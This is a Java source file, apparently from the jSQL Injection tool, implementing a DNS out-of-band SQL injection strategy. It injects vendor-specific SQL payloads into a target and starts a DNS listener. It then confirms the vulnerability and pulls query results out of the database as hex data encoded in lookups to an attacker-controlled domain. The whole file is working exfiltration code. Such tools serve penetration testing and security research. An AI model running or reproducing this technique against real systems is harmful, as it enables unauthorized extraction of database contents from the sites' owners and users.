/*******************************************************************************
 * Copyhacked (H) 2012-2025.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss it
 * every time possible with every body.
 *
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 *******************************************************************************/
package com.jsql.model.injection.strategy;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.ResourceAccess;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.AbstractInjectionBit.BlindOperator;
import com.jsql.model.injection.vendor.model.VendorYaml;
import com.jsql.model.suspendable.AbstractSuspendable;
import com.jsql.util.I18nUtil;
import com.jsql.util.LogLevelUtil;
import com.jsql.util.StringUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.regex.Pattern;

public class StrategyDns extends AbstractStrategy {

    private static final Logger LOGGER = LogManager.getRootLogger();
    private BlindOperator blindOperator;
    private final DnsServer dnsServer;

    public StrategyDns(InjectionModel injectionModel) {
        super(injectionModel);
        this.dnsServer = new DnsServer(injectionModel);
    }

    @Override
    public void checkApplicability() {
        if (this.injectionModel.getMediatorUtils().getPreferencesUtil().isStrategyDnsDisabled()) {
            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, AbstractStrategy.FORMAT_SKIP_STRATEGY_DISABLED, this.getName());
            return;
        } else if (
            StringUtils.isBlank(this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsDomain())
            || !StringUtils.isNumeric(this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsPort())
        ) {
            LOGGER.log(
                LogLevelUtil.CONSOLE_INFORM,
                "Incorrect domain '{}' or port '{}', skipping Dns strategy",
                this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsDomain(),
                this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsPort()
            );
            return;
        } else if (
            StringUtils.isEmpty(this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getDns())
        ) {
            LOGGER.log(
                LogLevelUtil.CONSOLE_INFORM,
                AbstractStrategy.FORMAT_STRATEGY_NOT_IMPLEMENTED,
                this.getName(),
                this.injectionModel.getMediatorVendor().getVendor()
            );
            return;
        }

        this.checkInjection(BlindOperator.OR);
        this.checkInjection(BlindOperator.AND);
        this.checkInjection(BlindOperator.STACK);
        this.checkInjection(BlindOperator.NO_MODE);

        if (this.isApplicable) {
            this.allow();
        } else {
            this.unallow();
        }
    }

    private void checkInjection(BlindOperator blindOperator) {
        if (this.isApplicable) {
            return;
        }
        this.blindOperator = blindOperator;
        LOGGER.log(
            LogLevelUtil.CONSOLE_DEFAULT,
            "{} [{}] with [{}]...",
            () -> I18nUtil.valueByKey(AbstractStrategy.KEY_LOG_CHECKING_STRATEGY),
            this::getName,
            () -> blindOperator
        );
        String vendorSpecificWithOperator = this.injectionModel.getMediatorVendor().getVendor().instance().sqlDns(
            String.format(
                "(select concat('', %s))",
                this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getConfiguration().getFailsafe().replace(VendorYaml.INDICE, "1")
            ),
            "1",
            blindOperator,
            false
        );

        new Thread(this.dnsServer::listen).start();
        this.injectionModel.injectWithoutIndex(vendorSpecificWithOperator, "dns#confirm");
        this.waitDnsResponse(2500);

        var domainName = this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsDomain();
        this.isApplicable = this.dnsServer.getResults().stream().anyMatch(
            s -> s.contains(domainName) && s.contains(StringUtil.toHex(ResourceAccess.WEB_CONFIRM_RESULT))
        );
        if (this.isApplicable) {
            this.dnsServer.getResults().clear();
            LOGGER.log(
                LogLevelUtil.CONSOLE_SUCCESS,
                "{} [{}] with [{}]",
                () -> I18nUtil.valueByKey(AbstractStrategy.KEY_LOG_VULNERABLE),
                this::getName,
                this.blindOperator::name
            );
        } else {
            this.dnsServer.close();
        }
    }

    @Override
    public void allow(int... i) {
        this.injectionModel.appendAnalysisReport(
            StringUtil.formatReport(LogLevelUtil.COLOR_BLU, "### Strategy: " + this.getName())
            + this.injectionModel.getReportWithoutIndex(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlDns(
                    StringUtil.formatReport(LogLevelUtil.COLOR_GREEN, "&lt;query&gt;"),
                    "1",
                    this.blindOperator,
                    true
                ),
                "metadataInjectionProcess",
                null
            )
        );
        this.markVulnerability(Interaction.MARK_DNS_VULNERABLE);
    }

    @Override
    public void unallow(int... i) {
        this.markVulnerability(Interaction.MARK_DNS_INVULNERABLE);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable, String metadataInjectionProcess) {
        new Thread(() -> this.injectionModel.injectWithoutIndex(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlDns(
                sqlQuery,
                startPosition,
                this.blindOperator,
                false
            ),
            metadataInjectionProcess
        )).start();
        this.waitDnsResponse(5000);

        String result = this.dnsServer.getResults().get(0);
        var domainName = this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsDomain();
        String regexToMatchTamperTags = String.format("(?i).{3}\\.([a-z0-9]*)\\..{3}\\.%s\\.", domainName);
        var matcherSql = Pattern.compile(regexToMatchTamperTags).matcher(result);
        if (matcherSql.find()) {
            result = matcherSql.group(1);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Incorrect DNS response: {}", result);
        }
        this.dnsServer.getResults().clear();
        return StringUtil.fromHex(result);
    }

    private void waitDnsResponse(int maxTime) {
        int currentTime = 0;
        while (this.dnsServer.getResults().isEmpty() && currentTime <= maxTime) {
            try {
                int waitTime = 250;
                Thread.sleep(waitTime);
                currentTime += waitTime;
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            }
        }
        if (currentTime > maxTime) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Missing DNS response after {} ms", maxTime);
        }
    }

    @Override
    public void activateWhenApplicable() {
        if (this.injectionModel.getMediatorStrategy().getStrategy() == null && this.isApplicable()) {
            LOGGER.log(
                LogLevelUtil.CONSOLE_INFORM,
                "{} [{}] with [{}]",
                () -> I18nUtil.valueByKey("LOG_USING_STRATEGY"),
                this::getName,
                this.blindOperator::name
            );
            this.injectionModel.getMediatorStrategy().setStrategy(this);

            var request = new Request();
            request.setMessage(Interaction.MARK_DNS_STRATEGY);
            this.injectionModel.sendToViews(request);
        }
    }
    
    @Override
    public String getPerformanceLength() {
        return VendorYaml.DEFAULT_CAPACITY;
    }
    
    @Override
    public String getName() {
        return "Dns";
    }
}
